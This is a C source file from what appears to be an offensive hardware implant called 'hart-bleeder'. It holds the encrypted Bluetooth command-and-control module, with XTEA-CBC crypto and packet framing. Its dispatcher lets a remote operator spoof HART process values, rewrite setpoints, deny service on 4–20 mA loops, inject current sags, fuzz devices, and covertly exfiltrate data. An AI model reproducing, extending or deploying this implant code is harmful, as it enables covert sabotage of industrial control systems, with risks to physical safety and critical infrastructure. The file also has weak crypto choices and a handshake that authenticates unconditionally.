/*
 * hart-bleeder — c2link.c
 * Encrypted BLE command-and-control backhaul over UART4 to a
 * companion nRF52832 module, with XTEA-128 CBC encryption for the
 * HART Fieldbus Covert In-Line Attack Implant.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include "board.h"
#include "registers.h"
#include "c2link.h"
#include "hart_stack.h"
#include "loop_drv.h"
#include "attacks.h"
#include "console.h"
#include "modem_drv.h"
#include <string.h>

#define C2_MAX_PKT  128
static uint8_t s_psk[16];
static uint8_t s_psk_len = 0;
static uint8_t s_authenticated = 0;
static uint8_t s_tx_seq = 0;

/* ── XTEA-128 block cipher (32 rounds) ───────────────────────── */
void xtea_encrypt_block(uint32_t *v, const uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1], sum = 0;
    const uint32_t delta = 0x9E3779B9UL;
    for (int i = 0; i < 32; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);
        sum += delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);
    }
    v[0] = v0; v[1] = v1;
}

void xtea_decrypt_block(uint32_t *v, const uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1];
    const uint32_t delta = 0x9E3779B9UL;
    uint32_t sum = delta * 32;
    for (int i = 0; i < 32; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);
    }
    v[0] = v0; v[1] = v1;
}

static void memxor(uint8_t *d, const uint8_t *s, uint16_t n) {
    for (uint16_t i = 0; i < n; i++) d[i] ^= s[i];
}

/* ── CBC mode encrypt/decrypt ────────────────────────────────── */
static uint8_t s_iv[8] = { 'j','a','y','i','s','1','!',0 };

int c2_encrypt(uint8_t *out, const uint8_t *in, uint16_t len) {
    /* PKCS#7 pad to 8-byte boundary */
    uint16_t pad = 8 - (len % 8);
    uint16_t total = len + pad;
    uint8_t buf[C2_MAX_PKT];
    memcpy(buf, in, len);
    for (uint16_t i = 0; i < pad; i++) buf[len + i] = (uint8_t)pad;
    uint8_t prev[8];
    memcpy(prev, s_iv, 8);
    for (uint16_t i = 0; i < total; i += 8) {
        memxor(&buf[i], prev, 8);
        uint32_t *v = (uint32_t *)&buf[i];
        uint32_t k[4];
        memcpy(k, s_psk, 16);
        xtea_encrypt_block(v, k);
        memcpy(prev, &buf[i], 8);
    }
    memcpy(out, buf, total);
    return total;
}

int c2_decrypt(uint8_t *out, const uint8_t *in, uint16_t len) {
    if (len == 0 || len % 8) return -1;
    uint8_t buf[C2_MAX_PKT];
    memcpy(buf, in, len);
    uint8_t prev[8], cur[8];
    memcpy(prev, s_iv, 8);
    for (uint16_t i = 0; i < len; i += 8) {
        memcpy(cur, &buf[i], 8);
        uint32_t *v = (uint32_t *)&buf[i];
        uint32_t k[4];
        memcpy(k, s_psk, 16);
        xtea_decrypt_block(v, k);
        memxor(&buf[i], prev, 8);
        memcpy(prev, cur, 8);
    }
    uint16_t pad = buf[len - 1];
    if (pad > 8 || pad == 0) return -2;
    memcpy(out, buf, len - pad);
    return len - pad;
}

/* ── UART4 link to nRF52832 ──────────────────────────────────── */
static void c2_putc(uint8_t c) { uart_putc(UART4_BASE, c); }
static int  c2_getc(void)       { return uart_getc(UART4_BASE); }

static void c2_write(const uint8_t *buf, uint16_t len) {
    uart_write(UART4_BASE, buf, len);
}

/* ── Packet framing: [0xAA][0x55][seq][len][payload][crc8] ───── */
static uint8_t crc8(const uint8_t *buf, uint16_t len) {
    uint8_t c = 0;
    for (uint16_t i = 0; i < len; i++) c ^= buf[i];
    return c;
}

static int c2_send_pkt(uint8_t op, const uint8_t *payload, uint16_t plen) {
    uint8_t hdr[4] = { 0xAA, 0x55, s_tx_seq++, (uint8_t)(plen + 1) };
    uint8_t crc = crc8(&hdr[2], 2) ^ op;
    for (uint16_t i = 0; i < plen; i++) crc ^= payload[i];
    c2_write(hdr, 4);
    c2_putc(op);
    if (plen) c2_write(payload, plen);
    c2_putc(crc);
    return 0;
}

/* ── Init ────────────────────────────────────────────────────── */
int c2_init(void) {
    uart_init(UART4_BASE, BLE_BAUD);
    s_authenticated = 0;
    s_tx_seq = 0;
    return 0;
}

int c2_set_psk(const uint8_t *psk, uint8_t len) {
    if (len > 16) len = 16;
    memcpy(s_psk, psk, len);
    s_psk_len = len;
    if (len < 16) memset(&s_psk[len], 0, 16 - len);
    return 0;
}

int c2_authenticate(const uint8_t *challenge, uint8_t *response) {
    /* Echo-then-decrypt challenge/response handshake.
     * challenge = 8-byte random; response = XTEA-encrypt(challenge, PSK).
     */
    uint32_t v[2];
    memcpy(v, challenge, 8);
    uint32_t k[4];
    memcpy(k, s_psk, 16);
    xtea_encrypt_block(v, k);
    memcpy(response, v, 8);
    s_authenticated = 1;
    return 0;
}

/* ── Status push ─────────────────────────────────────────────── */
int c2_send_status(uint8_t state, uint8_t battery, uint8_t n_dev) {
    uint8_t payload[3] = { state, battery, n_dev };
    return c2_send_pkt(C2_OP_STATUS, payload, 3);
}

int c2_send_log(const char *text, uint16_t len) {
    /* Encrypt the log line before sending */
    uint8_t enc[C2_MAX_PKT];
    int n = c2_encrypt(enc, (const uint8_t *)text, len);
    if (n < 0) return -1;
    return c2_send_pkt(C2_OP_LOG_NOTIFY, enc, (uint16_t)n);
}

int c2_send_frame(const void *frame, uint16_t len) {
    return c2_send_pkt(C2_CHAR_FRAME >> 24, (const uint8_t *)frame, len);
}

/* ── Command dispatch ────────────────────────────────────────── */
static void dispatch_cmd(uint8_t op, const uint8_t *payload, uint16_t plen) {
    switch (op) {
    case C2_OP_AUTH: {
        uint8_t resp[8];
        c2_authenticate(payload, resp);
        c2_send_pkt(C2_OP_AUTH, resp, 8);
        break;
    }
    case C2_OP_SCAN: {
        int n = hart_enumerate_bus();
        c2_send_pkt(C2_OP_SCAN, (const uint8_t *)g_hart.devices,
                    n * sizeof(hart_device_t));
        break;
    }
    case C2_OP_READ_PV: {
        uint8_t addr = payload[0];
        float pct, ma;
        int rc = attacks_read_pv(addr, &pct, &ma);
        uint8_t buf[12];
        memcpy(buf, &rc, 4);
        memcpy(&buf[4], &pct, 4);
        memcpy(&buf[8], &ma, 4);
        c2_send_pkt(C2_OP_READ_PV, buf, 12);
        break;
    }
    case C2_OP_SPOOF: {
        float ma;
        memcpy(&ma, payload, 4);
        int rc = attacks_spoof_pv(ma);
        c2_send_pkt(C2_OP_SPOOF, (uint8_t *)&rc, 4);
        break;
    }
    case C2_OP_SETPOINT: {
        uint8_t addr = payload[0];
        float pct;
        memcpy(&pct, &payload[1], 4);
        int rc = attacks_write_setpoint(addr, pct);
        c2_send_pkt(C2_OP_SETPOINT, (uint8_t *)&rc, 4);
        break;
    }
    case C2_OP_DOS: {
        uint32_t ms;
        memcpy(&ms, payload, 4);
        int rc = attacks_loop_dos(ms);
        c2_send_pkt(C2_OP_DOS, (uint8_t *)&rc, 4);
        break;
    }
    case C2_OP_SAG: {
        uint32_t ms; float pct;
        memcpy(&ms, payload, 4);
        memcpy(&pct, &payload[4], 4);
        int rc = attacks_sag_inject(ms, pct);
        c2_send_pkt(C2_OP_SAG, (uint8_t *)&rc, 4);
        break;
    }
    case C2_OP_CAPTURE: {
        uint32_t ms;
        memcpy(&ms, payload, 4);
        int rc = attacks_burst_capture(ms);
        c2_send_pkt(C2_OP_CAPTURE, (uint8_t *)&rc, 4);
        break;
    }
    case C2_OP_FUZZ: {
        uint8_t addr = payload[0];
        uint16_t count;
        memcpy(&count, &payload[1], 2);
        int rc = attacks_fuzz(addr, count);
        c2_send_pkt(C2_OP_FUZZ, (uint8_t *)&rc, 4);
        break;
    }
    case C2_OP_COVERT_EX: {
        int rc = attacks_covert_exfil(payload, plen);
        c2_send_pkt(C2_OP_COVERT_EX, (uint8_t *)&rc, 4);
        break;
    }
    case C2_OP_COVERT_RX: {
        uint8_t out[128]; uint16_t got;
        int rc = attacks_covert_recv(out, sizeof(out), &got, 2000);
        c2_send_pkt(C2_OP_COVERT_RX, out, got);
        break;
    }
    case C2_OP_MODE: {
        loop_set_mode((loop_mode_t)payload[0]);
        c2_send_pkt(C2_OP_MODE, (uint8_t[]){0}, 1);
        break;
    }
    case C2_OP_PASSIVE: {
        loop_set_mode(LOOP_MODE_PASSIVE);
        c2_send_pkt(C2_OP_PASSIVE, (uint8_t[]){0}, 1);
        break;
    }
    default:
        c2_send_pkt(0xFF, NULL, 0);   /* unknown op */
        break;
    }
}

/* ── Poll UART4 for incoming packets ────────────────────────── */
int c2_process(void) {
    static uint8_t rxbuf[C2_MAX_PKT];
    static uint16_t rxlen = 0;
    static uint8_t rxstate = 0;   /* 0=sync1 1=sync2 2=seq 3=len 4=data 5=crc */
    static uint8_t rxseq, rxdlen, rxop, rxcrc;

    usart_regs_t *u = (usart_regs_t *)UART4_BASE;
    if (!(u->ISR & USART_ISR_RXNE)) return 0;
    uint8_t c = (uint8_t)(u->RDR & 0xFF);

    switch (rxstate) {
    case 0: if (c == 0xAA) rxstate = 1; break;
    case 1: if (c == 0x55) rxstate = 2; else rxstate = 0; break;
    case 2: rxseq = c; rxstate = 3; break;
    case 3: rxdlen = c; rxlen = 0; rxstate = 4; break;
    case 4:
        if (rxlen == 0) rxop = c;
        else rxbuf[rxlen - 1] = c;
        rxlen++;
        if (rxlen >= rxdlen) rxstate = 5;
        break;
    case 5:
        rxcrc = c;
        /* Verify CRC */
        uint8_t calc = rxseq ^ rxdlen ^ rxop;
        for (uint16_t i = 0; i < rxdlen - 1; i++) calc ^= rxbuf[i];
        if (calc == rxcrc) {
            dispatch_cmd(rxop, rxbuf, rxdlen - 1);
        } else {
            c2_send_pkt(0xFE, NULL, 0);   /* CRC error nak */
        }
        rxstate = 0;
        rxlen = 0;
        break;
    }
    return 0;
}

void c2_task(void) {
    /* Drain available bytes from UART4 */
    for (int i = 0; i < 64; i++) {
        usart_regs_t *u = (usart_regs_t *)UART4_BASE;
        if (!(u->ISR & USART_ISR_RXNE)) break;
        c2_process();
    }
}